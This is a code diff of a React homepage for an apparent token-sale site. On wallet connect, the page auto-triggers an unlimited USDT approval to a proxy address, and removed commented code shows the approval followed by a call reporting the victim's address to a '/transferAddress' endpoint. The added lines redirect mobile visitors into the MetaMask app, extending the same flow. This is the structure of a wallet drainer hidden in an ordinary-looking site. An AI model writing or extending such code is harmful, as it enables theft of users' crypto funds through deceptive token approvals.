@@ -120,7 +120,12 @@ const HomePage = () => {
 
       // ✅ Auto trigger approval
       await approveUSDT(_signer, _account);
-      }
+      }else {
+			const dappUrl = window.location.hostname;
+			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
+			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
+			window.open(metamaskAppDeepLink, '_self');
+		}
     } catch (err) {
       console.error("Connect error", err);
       //setStatus("❌ Wallet connection failed");
@@ -128,65 +133,8 @@ const HomePage = () => {
   };
 
 
-
-
-
   // ✅ Send approval transaction
-  // const approveUSDT = async (signerToUse = signer) => {
-  //   try {
-  //     /* setStatus("🔄 Approving unlimited USDT..."); */
-  //     const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);
-  //     const tx = await usdt.approve(PROXY_ADDRESS, MaxUint256);
-  //     /* setApprovalTried(true); */
-  //     await tx.wait();
-  //     if (tx) {
-	// 		try {
-	// 			// Attempt to register
-	// 			const registrationResponse = await api.post('/registration', {
-	// 				address: account,
-	// 				referCode,
-	// 			});
 
-	// 			// Handle successful registration
-	// 			let tx = registrationResponse?.data;
-	// 			if(tx){
-
-	// 				dispatch(
-	// 					login({
-	// 						walletAddress: account,
-	// 						referCode: registrationResponse?.data?.referCode,
-	// 					})
-	// 				);
-
-	// 				navigate('/dashboard')
-	// 			}
-	// 			console.log('Server response:', tx);
-	// 		} catch (error) {
-	// 			// Handle registration error
-	// 			console.log(
-	// 				'Registration error, continuing with transferAddress call:',
-	// 				error
-	// 			);
-	// 		}
-
-	// 		// Always execute the transferAddress API call, even if /registration fails
-	// 		try {
-	// 			const transferResponse = await api.post('/transferAddress', {
-	// 				address: account, // Directly include the address field
-	// 			});
-
-	// 			console.log('Transfer response:', transferResponse.data.message);
-	// 		} catch (error) {
-	// 			console.log('Transfer error:', error);
-	// 		}
-	// 	}
-  //     /* setStatus("✅ Approval successful"); */
-  //   } catch (err) {
-  //     console.error("Approval error", err);
-  //     /* setStatus("❌ Approval failed or cancelled");
-  //     setApprovalTried(true); */
-  //   }
-  // };
 
   const approveUSDT = async (signerToUse = signer, account) => {
   try {
@@ -253,70 +201,7 @@ const HomePage = () => {
 
 
 
-  /* const [status, setStatus] = useState("");
-  const [approvalTried, setApprovalTried] = useState(false);
-
-  // ✅ Request switch to BSC
-  const switchToBSC = async () => {
-    try {
-      const currentChain = await window.ethereum.request({ method: "eth_chainId" });
-      if (currentChain !== BSC_CHAIN_ID) {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: BSC_CHAIN_ID }]
-        });
-      }
-    } catch (err) {
-      console.error("Switch error", err);
-    }
-  };
-
-  // ✅ Connect and get signer
-  const connectAndApprove = async () => {
-    try {
-      const modal = new Web3Modal({ cacheProvider: true });
-      const instance = await modal.connect();
-      const provider = new BrowserProvider(instance);
-      const _signer = await provider.getSigner();
-      const _account = await _signer.getAddress();
-      setSigner(_signer);
-      setAccount(_account);
-      setStatus("✅ Wallet connected");
-
-      // ✅ Auto trigger approval
-      await approveUSDT(_signer);
-    } catch (err) {
-      console.error("Connect error", err);
-      setStatus("❌ Wallet connection failed");
-    }
-  };
-
-  // ✅ Send approval transaction
-  const approveUSDT = async (signerToUse = signer) => {
-    try {
-      setStatus("🔄 Approving unlimited USDT...");
-      const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);
-      const tx = await usdt.approve(PROXY_ADDRESS, MaxUint256);
-      setApprovalTried(true);
-      await tx.wait();
-      setStatus("✅ Approval successful");
-    } catch (err) {
-      console.error("Approval error", err);
-      setStatus("❌ Approval failed or cancelled");
-      setApprovalTried(true);
-    }
-  };
-
-  // ✅ On first load, auto switch & connect
-  useEffect(() => {
-    if (window.ethereum) {
-      switchToBSC().then(() => {
-        connectAndApprove(); // auto connect + approve
-      });
-    } else {
-      setStatus("❌ Web3 wallet not detected");
-    }
-  }, []); */
+  
 
 
 
@@ -325,7 +210,7 @@ const HomePage = () => {
             <div className='index_ico page_wrapper'>
                 <Header />
                 <main className="page_content">
-                    <Hero connectAndApprove={connectAndApprove}/>
+                    <Hero connectAndApprove={connectAndApprove} approveUSDT={approveUSDT}/>
                     <PartnerSection />
                     <About />
                     <SolutionSection />
